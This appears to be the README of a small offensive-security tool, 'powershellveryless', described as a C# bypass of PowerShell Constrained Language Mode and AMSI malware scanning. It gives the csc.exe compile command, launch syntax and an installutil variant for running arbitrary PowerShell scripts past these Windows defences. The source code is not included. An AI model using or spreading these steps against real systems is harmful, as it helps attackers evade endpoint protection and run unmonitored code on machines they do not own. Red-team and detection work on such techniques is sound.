# powershellveryless
== Constrained Language Mode + AMSI bypass all in one ==<br /><br />
Quick & dirty (and very simple) CL + AMSI bypass using C#<br />
Compile it (https://decoder.cloud/2017/11/02/we-dont-need-powershell-exe/): 
```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /reference: C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0__31bf3856ad364e35\system.management.automation.dll 
/out:c:\setup\powershellveryless.exe c:\scripts\powershellveryless.cs
```
<br />
 Launch it: powerhsellveryless.exe (your_ps1_sript)
 <br />
powershellveryless_2.cs: "installutil" version <br />
```

C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil  /logfile= /LogToConsole=false /ScriptName=(ps1) /U (exefile)

```
